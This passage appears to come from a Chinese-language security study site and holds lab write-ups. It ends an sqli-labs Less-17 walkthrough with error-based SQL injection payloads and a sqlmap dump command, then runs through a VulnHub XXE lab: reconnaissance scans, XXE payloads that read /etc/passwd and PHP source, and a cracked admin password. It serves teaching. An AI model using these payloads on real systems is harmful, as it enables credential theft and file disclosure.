\u64cd\u4f5c\u662f\u5c06\u4e24\u4e2a\u67e5\u8be2\u7684\u7ed3\u679c\u96c6\u7eb5\u5411\u5408\u5e76\uff0c\u800c\u4e0d\u6d89\u53ca\u5b50\u67e5\u8be2\u7684\u6982\u5ff5\u3002\u6240\u4ee5\uff0c\u4e0d\u9700\u8981\u4e3a\u6bcf\u4e2a SELECT \u5b50\u53e5\u8bbe\u7f6e\u522b\u540d\u3002</p> <p>\uff08\u8fd9\u513f\u5176\u5b9e\u5c31\u662f\uff0c\u4e4b\u524d\u90fd\u662f\u5148\u628a\u540e\u7aef\u7684select\u8bed\u53e5\u95ed\u5408\u6389\uff0c\u7136\u540e\u518d\u6267\u884c\u6211\u4eec\u7684 union select \uff09</p> <p>Q\uff1a\u89e3\u91ca\u5b50\u67e5\u8be2\u8bed\u53e5</p> <p>A\uff1a\u5b50\u67e5\u8be2\u662f\u4e00\u4e2a\u5d4c\u5957\u5728\u4e3b\u67e5\u8be2\u4e2d\u7684\u67e5\u8be2\u8bed\u53e5\u3002</p> <p>\u5b50\u67e5\u8be2\u662f\u5728\u4e3b\u67e5\u8be2\u4e2d\u5d4c\u5957\u7684\u67e5\u8be2\u8bed\u53e5\uff0c\u53ef\u4ee5\u8fd4\u56de\u4e00\u4e2a\u7ed3\u679c\u96c6\uff0c\u7136\u540e\u4e3b\u67e5\u8be2\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u7ed3\u679c\u96c6\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u8fc7\u6ee4\u3001\u6bd4\u8f83\u6216\u64cd\u4f5c\u3002\u5b50\u67e5\u8be2\u901a\u5e38\u51fa\u73b0\u5728 <code>SELECT</code>\u3001<code>FROM</code>\u3001<code>WHERE</code> \u7b49\u5b50\u53e5\u4e2d\u3002</p> <p>\u4f8b\u5982\uff0c\u4e0b\u9762\u662f\u4e00\u4e2a\u4f7f\u7528\u5b50\u67e5\u8be2\u7684\u793a\u4f8b\uff1a</p> SQL<pre><code>SELECT column1\nFROM table1\nWHERE column2 = (SELECT some_column FROM table2 WHERE condition);\n</code></pre> <p>\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c<code>(SELECT some_column FROM table2 WHERE condition)</code> \u5c31\u662f\u4e00\u4e2a\u5b50\u67e5\u8be2\uff0c\u5b83\u8fd4\u56de\u4e00\u4e2a\u503c\uff0c\u7136\u540e\u4e3b\u67e5\u8be2\u4f7f\u7528\u8fd9\u4e2a\u503c\u8fdb\u884c\u6761\u4ef6\u8fc7\u6ee4\u3002</p> <p>\u800c <code>AND</code>\u3001<code>OR</code> \u662f\u903b\u8f91\u8fd0\u7b97\u7b26\uff0c\u7528\u4e8e\u8fde\u63a5\u591a\u4e2a\u6761\u4ef6\uff0c\u4f8b\u5982\uff1a</p> SQL<pre><code>SELECT *\nFROM table\nWHERE column1 = 'value' AND column2 &gt; 10;\n</code></pre> <p>\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c<code>AND</code> \u8fde\u63a5\u4e86\u4e24\u4e2a\u6761\u4ef6\uff0c\u8981\u6c42\u540c\u65f6\u6ee1\u8db3 <code>column1 = 'value'</code> \u548c <code>column2 &gt; 10</code>\u3002</p> <p>\u603b\u7684\u6765\u8bf4\uff0c\u5b50\u67e5\u8be2\u662f\u4e00\u4e2a\u5d4c\u5957\u5728\u4e3b\u67e5\u8be2\u4e2d\u7684\u5b8c\u6574\u67e5\u8be2\u8bed\u53e5\uff0c\u800c <code>AND</code>\u3001<code>OR</code> \u7b49\u662f\u7528\u4e8e\u8fde\u63a5\u591a\u4e2a\u6761\u4ef6\u7684\u903b\u8f91\u8fd0\u7b97\u7b26\u3002</p> <p>(\u8fd9\u513f\u6211\u611f\u89c9\u548c\u540e\u7aef\u4ee3\u7801\u6709\u5173\u7cfb\uff0c\u540e\u7aef\u4ee3\u7801\u662f\u8981\u4fee\u6539\u6570\u636e\u5e93\u5185\u5bb9\uff0c\uff08\u5148 select \u5339\u914d\u8d26\u6237\uff0c\u7136\u540e updata \u4fee\u6539\u5bc6\u7801\uff09\u7136\u540e\u6211\u4eec\u7684payload\u62fc\u63a5\u8fdb\u53bb\u540e\u5c31\u5f62\u6210\u4e86\u5b50\u67e5\u8be2\u3002)</p> <p>==\u7b2c\u4e8c\u4e2a\u7591\u95ee\uff1a==</p> Text Only<pre><code>1' and (extractvalue(1,concat(0x5c,(select group_concat(username,password) from users),0x5c)))#                      \u7206\u5b57\u6bb5\u5185\u5bb9\u3002\n</code></pre> <p>\u8fd9\u4e2a\u4f1a\u62a5\u9519\uff08You can't specify target table 'users' for update in FROM clause\uff09\uff08\u4e0d\u80fd\u5728 FROM \u5b50\u53e5\u4e2d\u6307\u5b9a\u8981\u66f4\u65b0\u7684\u76ee\u6807\u8868\u201cusers\u201d\uff09</p> <p>\u4f46\u662f\u8fd9\u4e2a\u62a5\u9519\u5f88\u6b63\u5e38\uff0c\u539f\u56e0\u662fmysql\u6570\u636e\u4e0d\u652f\u6301\u67e5\u8be2\u548c\u66f4\u65b0\u662f\u540c\u4e00\u5f20\u8868\u3002\u6240\u4ee5\u6211\u4eec\u9700\u8981\u52a0\u4e00\u4e2a\u4e2d\u95f4\u8868\u3002\u8fd9\u4e2a\u5173\u5361\u9700\u8981\u8f93\u5165\u6b63\u786e\u8d26\u53f7\u56e0\u4e3a\u662f\u5bc6\u7801\u91cd\u7f6e\u9875\u9762\uff0c\u6240\u4ee5\u7206\u51fa\u7684\u662f\u8be5\u8d26\u6237\u7684\u539f\u59cb\u5bc6\u7801\u3002\u5982\u679c\u67e5\u8be2\u65f6\u4e0d\u662fusers\u8868\u5c31\u4e0d\u4f1a\u62a5\u9519\u3002</p> <p>\u793a\u4f8b\uff1a\u67e5\u7528\u6237\u540d\uff1a</p> Text Only<pre><code> -1' and updatexml(1,concat(0x7e,(select group_concat(username) from users)),1) # \n</code></pre> <p>\u8fd9\u4e2a\u4f1a\u62a5\u9519\uff0c\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u7528\u5176\u4ed6\u65b9\u6cd5\u7ed5\u8fc7 \uff0c\u5c06\u8868\u540dusers\u7528<code>(select username from users)a</code>\u66ff\u6362\u6389</p> Text Only<pre><code>-1' and updatexml(1,concat(0x7e,(select group_concat(username) from (select username from users)a)),1)#\n</code></pre> Text Only<pre><code>-1' and updatexml(1,concat(0x7e,mid((select group_concat(username) from (select username from users)a),32,32)),1)#\n</code></pre> <p>\u793a\u4f8b\uff1a\u67e5\u5bc6\u7801\uff1a(\u4ecd\u7136\u62a5\u9519\uff1aOnly constant XPATH queries are supported\uff08\u4ec5\u652f\u6301\u5e38\u91cf XPATH \u67e5\u8be2\uff09)</p> Text Only<pre><code>-1' and updatexml(1,concat(0x7e,mid((select group_concat(password) from (select username from users)a),1,32)),1)#\n</code></pre> <p>\u4f46\u8fd9\u4e00\u5173\u77e5\u9053\u7528\u6237\u540d\u5c31\u53ef\u4ee5\u968f\u4fbf\u6539\u5bc6\u7801\u4e86\u5440</p> <p>\uff08\u6765\u81eahttps://blog.csdn.net/dreamthe/article/details/123795302\uff09</p> <p>\uff08\u6765\u81eahttps://blog.csdn.net/l2872253606/article/details/124411903\uff09</p> <p>\u540c\u6837\uff0c\u4f7f\u7528sqlmap\uff1a<code>python3 sqlmap.py -r \"D:\\post.txt\" -D security -T users --columns --dump</code></p> <p>\u5e76\u4e0d\u80fd\u6210\u529f\u8dd1\u51fa\u6570\u636e\u6765\uff0c\u56e0\u4e3a\u8fd9\u513f\u6211\u4eec\u8dd1\u7684\u65f6\u5019\u4f1a\u76f4\u63a5\u7ed9\u66ff\u6362\u6389\uff0c\u4e5f\u5c31\u662f\u8bf4\u8dd1\u51fa\u6765\u7684\u5e76\u4e0d\u662f\u539f\u6570\u636e\u5e93\u7684\u5bc6\u7801\uff0c\u800c\u662f\u66ff\u6362\u4e4b\u540e\u7684\u5bc6\u7801\uff08\u540e\u7aef\u4ee3\u7801\u672c\u6765\u5c31\u662f\u5148 <code>select</code> \u5339\u914d\u8d26\u6237\uff0c\u7136\u540e <code>updata</code> \u4fee\u6539\u5bc6\u7801\uff09\u3002</p> <p>\uff08\u4f60\u53ef\u4ee5\u8fb9\u8ba9 sqlmap \u8dd1\uff0c\u8fb9\u5237\u65b0<code>Navicat</code>\uff0c\u7785\u7785\u6570\u636e\u5e93\u90fd\u906d\u9047\u4e86\u4ec0\u4e48\u6298\u78e8\u2026\u2026\u54ce\u2026\u2026\u771f\u7684\u662f\u2026\u2026\u54ce\uff09</p> <p>\u590d\u539f\u7684\u65b9\u6cd5\u5c31\u662f\u91cd\u7f6e\u4e00\u4e0b sqli-labs \u6570\u636e\u5e93</p> <p>\u4f46\u8fd9\u4e00\u5173\u77e5\u9053\u7528\u6237\u540d\u5c31\u53ef\u4ee5\u968f\u4fbf\u6539\u5bc6\u7801\u4e86\u5440</p> <p>// txt\u5185\u5bb9\u5982\u4e0b\uff1a</p> Text Only<pre><code>POST /sqli-labs/Less-17/ HTTP/1.1\nHost: 127.0.0.1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 36\nOrigin: http://127.0.0.1\nConnection: close\nReferer: http://127.0.0.1/sqli-labs/Less-17/\nUpgrade-Insecure-Requests: 1\nSec-Fetch-Dest: document\nSec-Fetch-Mode: navigate\nSec-Fetch-Site: same-origin\nSec-Fetch-User: ?1\n\nuname=admin&amp;passwd=asd*&amp;submit=Submit\n</code></pre>"},{"location":"WEB/labs/XXE%E6%89%93%E9%9D%B6/","title":"XXE \u6253\u9776\u8bb0\u5f55","text":"<p>\u9776\u573a\u4e0b\u8f7d\u5730\u5740\uff1ahttps://download.vulnhub.com/xxe/XXE.zip</p> <p>\u8fd9\u662f\u4e00\u4e2a\u865a\u62df\u673a\uff0c\u6240\u4ee5\u9700\u8981\u7528\u5230 <code>VmWare</code></p>"},{"location":"WEB/labs/XXE%E6%89%93%E9%9D%B6/#1","title":"1","text":"<p>\u5148\u6253\u5f00XXE\u9776\u573a\uff0c\u6b64\u65f6\u865a\u62df\u673a\u662f\u9501\u7740\u7684\uff0c\u9700\u8981\u6211\u4eec\u8fdb\u884c\u4fe1\u606f\u6536\u96c6\u548c\u64cd\u4f5c\u624d\u80fd\u767b\u5f55\u3002</p> <p>\u56e0\u4e3aXXE\u548c\u6211\u4eec\u7684Kali\u5728\u540c\u4e00\u4e2a\u5c40\u57df\u7f51\u5185\uff0c\u6240\u4ee5\u6211\u4eec\u5148\u770b\u770bKali\u7684IP\u5730\u5740\uff1a\uff08<code>ifconfig</code>\uff09 (\u5f97\u5230192.168.177.129)</p> <p>\u6253\u5f00Kali\u7ec8\u7aef\uff0c\u5207\u6362\u6210\u7ba1\u7406\u5458\uff08<code>su -</code>\uff09\uff0c\u626bIP\uff08<code>nmap -sP 192.168.177.0/24</code>\uff09\uff08\u524d\u4e09\u4f4d\u76f8\u540c\uff09</p> <p>namp -sP 1.1.1.0/24\u67e5\u770b\u8be5\u7f51\u6bb5\u4e0b\u7684\u5b58\u6d3b\uff08\u5728\u7ebf\uff09\u7684\u4e3b\u673a\uff080\uff0c1\uff0c255\uff0c254\u90fd\u4e0d\u662f\uff0c\u4e00\u822c\u662fkali\u7684\u5e7f\u64ad\u5730\u5740\uff09</p> <p>192.168.88.0/24\uff0c\u56e0\u4e3axxe\u865a\u62df\u673a\u548ckali\u662f\u4e00\u4e2a\u5c40\u57df\u7f51\u7684\uff0c\u6240\u4ee5\u524d\u9762\u4e09\u4e2a\u6570\u5b57\u90fd\u4e00\u6837\uff0c\u53ea\u9700\u8981\u77e5\u9053\u6700\u540e\u4e00\u4e2a\u6570\u5b57\u5c31\u884c\uff0c\u90a3\u5c31\u662f\u5b50\u7f51\u63a9\u7801\u4e3a24</p> <p>\u7ed3\u679c\u5982\u4e0b\uff1a</p> Text Only<pre><code>\u250c\u2500\u2500(root\u327fkali)-[~]\n\u2514\u2500# nmap -sP 192.168.177.0/24\n\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-19 15:29 CST\nNmap scan report for 192.168.177.1\nHost is up (0.0024s latency).\nMAC Address: 00:50:56:C0:00:08 (VMware)\nNmap scan report for 192.168.177.2\nHost is up (0.0019s latency).\nMAC Address: 00:50:56:F6:B2:84 (VMware)\nNmap scan report for 192.168.177.131\nHost is up (0.0014s latency).\nMAC Address: 00:0C:29:C1:C0:28 (VMware)\nNmap scan report for 192.168.177.254\nHost is up (0.00056s latency).\nMAC Address: 00:50:56:E4:4D:D7 (VMware)\nNmap scan report for 192.168.177.129\nHost is up.\nNmap done: 256 IP addresses (5 hosts up) scanned in 2.28 seconds\n</code></pre> <p>\u6216\u8005\u7528Linux\u7684<code>arp-scan</code>\u4e5f\u884c\uff0c\uff08<code>arp-scan -l</code>\uff09</p> <p>\u7ed3\u679c\u5982\u4e0b\uff1a</p> Text Only<pre><code>\u250c\u2500\u2500(root\u327fkali)-[~]\n\u2514\u2500# arp-scan -l                 \nInterface: eth0, type: EN10MB, MAC: 00:0c:29:fd:d2:9f, IPv4: 192.168.177.129\nStarting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)\n192.168.177.1   00:50:56:c0:00:08       VMware, Inc.\n192.168.177.2   00:50:56:f6:b2:84       VMware, Inc.\n192.168.177.131 00:0c:29:c1:c0:28       VMware, Inc.\n192.168.177.254 00:50:56:e7:ae:65       VMware, Inc.\n\n4 packets received by filter, 0 packets dropped by kernel\nEnding arp-scan 1.10.0: 256 hosts scanned in 2.447 seconds (104.62 hosts/sec). 4 responded\n</code></pre> <p>\u56e0\u4e3a<code>0\uff0c1\uff0c255\uff0c254</code>\u8fd9\u4e9b\u8fb9\u7f18\u4f4d\u7f6e\u7684\u4e00\u822c\u662fkali\u7684\u5e7f\u64ad\u5730\u5740\uff0c\u7136\u540e129\u662f\u672c\u673a\u5730\u5740\uff0c\u6240\u4ee5\u5c31\u53ea\u5269\u4e0b\u4e86131\u3002</p>"},{"location":"WEB/labs/XXE%E6%89%93%E9%9D%B6/#2","title":"2","text":"<p>\u4e4b\u540e\u6211\u4eec\u7ee7\u7eed\u7528nmap\u626b\u63cf\u5f00\u653e\u7684\u7aef\u53e3\uff08<code>nmap 192.169.177.131</code>\uff09\uff0c</p> <p>\u7ed3\u679c\u5982\u4e0b\uff1a</p> Text Only<pre><code>\u250c\u2500\u2500(root\u327fkali)-[~]\n\u2514\u2500# nmap 192.168.177.131\n\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-19 15:36 CST\nNmap scan report for 192.168.177.131\nHost is up (0.00075s latency).\nNot shown: 999 closed tcp ports (reset)\nPORT   STATE SERVICE\n80/tcp open  http\nMAC Address: 00:0C:29:C1:C0:28 (VMware)\n\nNmap done: 1 IP address (1 host up) scanned in 0.85 seconds\n</code></pre> <p>\u53ea\u626b\u5230\u4e8680\u7aef\u53e3\uff0c\u90a3\u6211\u4eec\u5c31\u8bbf\u95ee<code>192.168.177.131:80</code>\uff0c\u4f9d\u65e7\u4ec0\u4e48\u90fd\u6ca1\u6709\u3002</p>"},{"location":"WEB/labs/XXE%E6%89%93%E9%9D%B6/#3","title":"3","text":"<p>\u8fd9\u65f6\u5019\u6ca1\u7ebf\u7d22\u4e86\uff0c\u5c31\u53bb\u770b\u770b\u8be5IP\u4e0b\u7684\u6587\u4ef6\u76ee\u5f55</p> <p><code>dirb http://192.168.177.131/ -X .txt,.php,.zip</code></p> <p>\u626b\u63cf\u8be5ip\u4e0b\u7684<code>.txt</code>\u3001<code>.php</code>\u3001<code>.zip</code>\u540e\u7f00\u6587\u4ef6\u3002</p> <p>\u7ed3\u679c\u5982\u4e0b\uff1a</p> Text Only<pre><code>\u250c\u2500\u2500(root\u327fkali)-[~]\n\u2514\u2500# dirb http://192.168.177.131/ -X .txt,.php,.zip\n\n-----------------\nDIRB v2.22    \nBy The Dark Raver\n-----------------\n\nSTART_TIME: Tue Mar 19 15:43:01 2024\nURL_BASE: http://192.168.177.131/\nWORDLIST_FILES: /usr/share/dirb/wordlists/common.txt\nEXTENSIONS_LIST: (.txt,.php,.zip) | (.txt)(.php)(.zip) [NUM = 3]\n\n-----------------\n\nGENERATED WORDS: 4612                                                          \n\n---- Scanning URL: http://192.168.177.131/ ----\n+ http://192.168.177.131/robots.txt (CODE:200|SIZE:76)                          \n\n-----------------\nEND_TIME: Tue Mar 19 15:43:51 2024\nDOWNLOADED: 13836 - FOUND: 1\n</code></pre> <p>\u626b\u63cf\u5230\u4e86\u4e00\u4e2a<code>robot.txt</code>\u6587\u4ef6\uff0c\u8fd9\u662f\u4e00\u4e2a\u7f51\u7edc\u722c\u866b\u6307\u793a\u6587\u4ef6\uff0c\u90a3\u6211\u4eec\u5c31\u8bbf\u95ee\u770b\u4e00\u770b\u3002</p> <p>\u5185\u5bb9\u5982\u4e0b\uff1a</p> Text Only<pre><code>User-agent: *\nAllow: /\n\nUser-Agent: *\nDisallow: /xxe/*\nDisallow: /admin.php\n</code></pre> <p>\u90a3\u6211\u4eec\u5c31\u8bbf\u95ee\u4e00\u4e0b<code>/xxe/</code>\u548c<code>/xxe/admin.php</code>\u3002</p> <p>\u5f97\u5230\u4e86\u4e24\u4e2a\u4e0d\u540c\u7684\u767b\u9646\u754c\u9762\u3002</p> <p>PS\uff1a\u5fa1\u5251\u3001dirsearch\u7b49Web\u76ee\u5f55\u626b\u63cf\u5de5\u5177\u4e5f\u884c\u3002 </p>"},{"location":"WEB/labs/XXE%E6%89%93%E9%9D%B6/#4","title":"4","text":"<p>\u8865\u5145\u4e00\u4e0b<code>/etc/passwd</code>\uff1a</p> <p><code>/etc/passwd</code> \u662fLinux\u4e0b\u7684\u4e00\u4e2a\u91cd\u8981\u7684\u6587\u4ef6\uff0c\u7528\u4e8e\u5b58\u50a8 Linux \u7cfb\u7edf\u4e2d\u7528\u6237\u7684\u57fa\u672c\u5c5e\u6027\u548c\u767b\u5f55 Shell \u7684\u8bb0\u5f55\uff0c\u4f46\u662f\u91cc\u9762\u7684\u5185\u5bb9\u662f\u52a0\u5bc6\u8fc7\u7684\uff0c\u6240\u4ee5\u901a\u5e38\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\u53ea\u662f\u4e3a\u4e86\u9a8c\u8bc1\u4e00\u4e0b\u3002</p> <p>\u6211\u4eec\u5c1d\u8bd5\u767b\u9646<code>/xxe/</code>\uff0c\u7528Burp\u6293\u5305\uff0c\u6570\u636e\u5305\u5982\u4e0b\uff1a</p> Text Only<pre><code>POST /xxe/xxe.php HTTP/1.1\nHost: 192.168.177.131\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0\nAccept: */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate, br\nContent-Type: text/plain;charset=UTF-8\nContent-Length: 94\nOrigin: http://192.168.177.131\nConnection: close\nReferer: http://192.168.177.131/xxe/\n\n&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;root&gt;&lt;name&gt;admin&lt;/name&gt;&lt;password&gt;pass&lt;/password&gt;&lt;/root&gt;\n</code></pre> <p>\u56e0\u4e3a\u662fXML\u63d0\u4ea4\u7684\u6570\u636e\uff0c\u6240\u4ee5\u6211\u4eec\u6d4b\u8bd5\u4e00\u4e0b\uff0c\u5c06\u4ee5\u4e0b\u5185\u5bb9\u66ff\u6362\u539f\u6570\u636e\u5305\u4e2d\u7684XML\u90e8\u5206\u3002</p> Text Only<pre><code>&lt;?xml version=\"1.0\" ?&gt;\n&lt;!DOCTYPE r [\n&lt;!ELEMENT r ANY &gt;\n&lt;!ENTITY sp SYSTEM \"file:///etc/passwd\"&gt;\n]&gt;\n&lt;root&gt;&lt;name&gt;&amp;sp;&lt;/name&gt;&lt;password&gt;hj&lt;/password&gt;&lt;/root&gt;\n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\u6210\u529f\u8fd4\u56de\u4e86<code>ect/passwd</code>\u7684\u5185\u5bb9\uff0c\u8bf4\u660e\u5b58\u5728XXE\u6f0f\u6d1e\u3002</p> <p>\u89e3\u8bfb\u4e00\u4e0b\u8fd9\u6bb5XML\u4ee3\u7801\uff1a</p> <p>\u8fd9\u6bb5XML\u4ee3\u7801\u662f\u4e00\u4e2a\u7b80\u5355\u7684XML\u6587\u6863\uff0c\u7528\u4e8e\u8868\u793a\u6570\u636e\u3002\u8ba9\u6211\u4eec\u9010\u884c\u6765\u89e3\u91ca\u5b83\uff1a</p> <ol> <li> <p><code>&lt;?xml version=\"1.0\" ?&gt;</code>: \u8fd9\u662fXML\u58f0\u660e\uff0c\u5b83\u6307\u5b9a\u4e86XML\u6587\u6863\u7684\u7248\u672c\u3002</p> </li> <li> <p><code>&lt;!DOCTYPE r [</code>: \u8fd9\u662f\u6587\u6863\u7c7b\u578b\u5b9a\u4e49\uff08Document Type Definition\uff0cDTD\uff09\u7684\u5f00\u59cb\u3002\u5b83\u5b9a\u4e49\u4e86XML\u6587\u6863\u4e2d\u53ef\u4ee5\u4f7f\u7528\u7684\u5143\u7d20\u4ee5\u53ca\u5b83\u4eec\u7684\u7ed3\u6784\u3002</p> </li> <li> <p><code>&lt;!ELEMENT r ANY &gt;</code>: \u8fd9\u662fDTD\u4e2d\u7684\u5143\u7d20\u58f0\u660e\uff0c\u5b83\u5b9a\u4e49\u4e86\u540d\u4e3a\"r\"\u7684\u5143\u7d20\u3002\u5728\u8fd9\u91cc\uff0c\"r\"\u5143\u7d20\u88ab\u58f0\u660e\u4e3a\u53ef\u4ee5\u5305\u542b\u4efb\u610f\u5185\u5bb9\u3002</p> </li> <li> <p><code>&lt;!ENTITY sp SYSTEM \"file:///etc/passwd\"&gt;</code>: \u8fd9\u662fDTD\u4e2d\u7684\u5b9e\u4f53\u58f0\u660e\uff0c\u5b83\u5b9a\u4e49\u4e86\u540d\u4e3a\"sp\"\u7684\u5b9e\u4f53\u3002\u5728\u8fd9\u91cc\uff0c\"sp\"\u5b9e\u4f53\u88ab\u58f0\u660e\u4e3a\u5f15\u7528\u4e86\u4e00\u4e2a\u540d\u4e3a\"file:///etc/passwd\"\u7684\u7cfb\u7edf\u6587\u4ef6\u3002</p> </li> <li> <p><code>&lt;root&gt;</code>: \u8fd9\u662fXML\u6587\u6863\u4e2d\u7684\u6839\u5143\u7d20\u3002</p> </li> <li> <p><code>&lt;name&gt;&amp;sp;&lt;/name&gt;</code>: \u8fd9\u662f\u4e00\u4e2a\u540d\u4e3a\"name\"\u7684\u5143\u7d20\uff0c\u5176\u5185\u5bb9\u88ab\u5b9a\u4e49\u4e3a\u5f15\u7528\"sp\"\u5b9e\u4f53\u3002\u56e0\u6b64\uff0c\"name\"\u5143\u7d20\u7684\u5185\u5bb9\u5c06\u88ab\u66ff\u6362\u4e3a\"file:///etc/passwd\"\u3002</p> </li> <li> <p><code>&lt;password&gt;hj&lt;/password&gt;</code>: \u8fd9\u662f\u4e00\u4e2a\u540d\u4e3a\"password\"\u7684\u5143\u7d20\uff0c\u5176\u5185\u5bb9\u4e3a\"hj\"\u3002</p> </li> <li> <p><code>&lt;/root&gt;</code>: \u6839\u5143\u7d20\u7684\u7ed3\u675f\u6807\u7b7e\u3002</p> </li> </ol> <p>\u7efc\u4e0a\u6240\u8ff0\uff0c\u8be5XML\u6587\u6863\u5177\u6709\u4e00\u4e2a\u6839\u5143\u7d20\"root\"\uff0c\u5176\u4e2d\u5305\u542b\u4e86\u4e00\u4e2a\u540d\u4e3a\"name\"\u7684\u5143\u7d20\u548c\u4e00\u4e2a\u540d\u4e3a\"password\"\u7684\u5143\u7d20\u3002\"name\"\u5143\u7d20\u7684\u5185\u5bb9\u88ab\u66ff\u6362\u4e3a\"file:///etc/passwd\"\uff0c\u800c\"password\"\u5143\u7d20\u7684\u5185\u5bb9\u4e3a\"hj\"\u3002\u8bf7\u6ce8\u610f\uff0c\"file:///etc/passwd\"\u662f\u4e00\u4e2a\u6307\u5411\u7cfb\u7edf\u4e2d\u7684\u6587\u4ef6\u8def\u5f84\uff0c\u5b83\u53ef\u80fd\u5305\u542b\u6709\u5173\u7528\u6237\u7684\u654f\u611f\u4fe1\u606f\u3002\u8fd9\u6bb5XML\u53ef\u80fd\u610f\u56fe\u8bfb\u53d6\u8be5\u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u5e76\u5c06\u654f\u611f\u4fe1\u606f\u5d4c\u5165\u5230XML\u6587\u6863\u4e2d\u3002\u8fd9\u79cd\u884c\u4e3a\u53ef\u80fd\u4f1a\u5bfc\u81f4\u5b89\u5168\u98ce\u9669\uff0c\u56e0\u6b64\u5728\u5904\u7406XML\u6570\u636e\u65f6\u5e94\u8c28\u614e\u5bf9\u5f85\u3002</p>"},{"location":"WEB/labs/XXE%E6%89%93%E9%9D%B6/#5","title":"5","text":"<p>\u6211\u4eec\u7ee7\u7eed\u5229\u7528XXE\u6f0f\u6d1e\uff0c\u5c06XML\u90e8\u5206\u66ff\u6362\u4e3a\u4ee5\u4e0b\u5185\u5bb9\uff1a</p> Text Only<pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE r [\n&lt;!ELEMENT r ANY &gt;\n&lt;!ENTITY admin SYSTEM \"php://filter/read=convert.base64-encode/resource=admin.php\"&gt;\n]&gt;\n&lt;root&gt;&lt;name&gt;&amp;admin;&lt;/name&gt;&lt;password&gt;admin&lt;/password&gt;&lt;/root&gt;\n</code></pre> <p>\u5f97\u5230\u7684\u5173\u952e\u6570\u636e\u5982\u4e0b\uff1a</p> PHP<pre><code>&lt;?php\n$msg = '';\nif (\n    isset($_POST['login']) &amp;&amp; !empty($_POST['username'])\n    &amp;&amp; !empty($_POST['password'])\n) {\n\n    if (\n        $_POST['username'] == 'administhebest' &amp;&amp;\n        md5($_POST['password']) == 'e6e061838856bf47e1de730719fb2609'\n    ) {\n        $_SESSION['valid'] = true;\n        $_SESSION['timeout'] = time();\n        $_SESSION['username'] = 'administhebest';\n\n        echo \"You have entered valid use name and password &lt;br /&gt;\";\n        $flag = \"Here is the &lt;a style='color:FF0000;' href='/flagmeout.php'&gt;Flag&lt;/a&gt;\";\n        echo $flag;\n    } else {\n        $msg = 'Maybe Later';\n    }\n}\n</code></pre> <p>\u90a3\u6211\u4eec\u5c31\u5c06\u5bc6\u7801MD5\u89e3\u7801https://www.cmd5.com/\uff0c\u5f97\u5230<code>admin@123</code></p>"},{"location":"WEB/labs/XXE%E6%89%93%E9%9D%B6/#6","title":"6","text":"<p>\u56e0\u4e3a\u662f<code>/xxe/admin.php</code>\u9875\u9762\u8fd4\u56de\u6765\u7684\u7ed3\u679c\uff0c\u90a3\u6211\u4eec\u5c31\u7528\u8d26\u53f7\uff1a<code>administhebest</code>\uff0c\u5bc6\u7801\uff1a<code>admin@123</code>\u767b\u9646\u4e00\u4e0b\u3002</p> <p>\u767b\u5f55\u4e4b\u540e\u9875\u9762\u6709\u4e00\u4e2a\u8d85\u94fe\u63a5\uff0c\u94fe\u63a5\u5230<code>/flagmeout.php</code>\uff0c\u8bbf\u95ee\uff0c\u76f4\u63a5NotFound\u4e86\u3002</p> <p>\u90a3\u6211\u4eec\u5c31\u8fd8\u662f\u56de\u5230<code>/xxe/</code>\uff0c\u8fd9\u6b21\u5c06<code>/flagmeout.php</code>\u7528base64\u8fd4\u56de\u56de\u6765\u3002</p> <p>XML\u5982\u4e0b\uff1a</p> Text Only<pre><code>&lt;?xml version=\"1.0\" ?&gt;\n&lt;!DOCTYPE r [\n&lt;!ELEMENT r ANY &gt;\n&lt;!ENTITY sp SYSTEM \"php://filter/read=convert.base64-encode/resource=flagmeout.php\"&gt;\n]&gt;\n&lt;root&gt;&lt;name&gt;&amp;sp;&lt;/name&gt;&lt;password&gt;hj&lt;/password&gt;&lt;/root&gt;\n</code></pre> <p>\u7ed3\u679c\u5982\u4e0b\uff1a</p> PHP<pre><code>&lt;?php\n$flag = \"&lt;!-- the flag in (JQZFMMCZPE4HKWTNPBUFU6JVO5QUQQJ5) --&gt;\";\necho $flag;\n?&gt;\n</code></pre> <p>\u63a5\u4e0b\u6765\u5f53\u7136\u5c31\u662f\u89e3\u7801\uff1a</p> <p>\u56e0\u4e3a\u5168\u662f\u5927\u5199\u6240\u4ee5\u731c\u6d4b\u662fbase32\u7f16\u7801\uff0c\u5f97\u5230<code>L2V0Yy8uZmxhZy5waHA=</code>\uff0c\u518dbase64\u89e3\u7801\uff0c\u5f97\u5230<code>/etc/.flag.php</code>\uff0c\u5176\u5b9e\u76f4\u63a5<code>CyberChef</code>\u5c31\u884c\u4e86</p>"},{"location":"WEB/labs/XXE%E6%89%93%E9%9D%B6/#7","title":"7","text":"<p>\u65e2\u7136\u5f97\u5230\u4e86<code>/etc/.flag.php</code>\uff0c\u90a3\u6211\u4eec\u4e0b\u4e00\u6b65\u5f53\u7136\u5c31\u662f\u8bbf\u95ee\u5b83\u4e86\u3002</p> <p>XML\u5982\u4e0b\uff1a</p> Text Only<pre><code>&lt;?xml version=\"1.0\" ?&gt;\n&lt;!DOCTYPE r [\n&lt;!ELEMENT r ANY &gt;\n&lt;!ENTITY sp SYSTEM 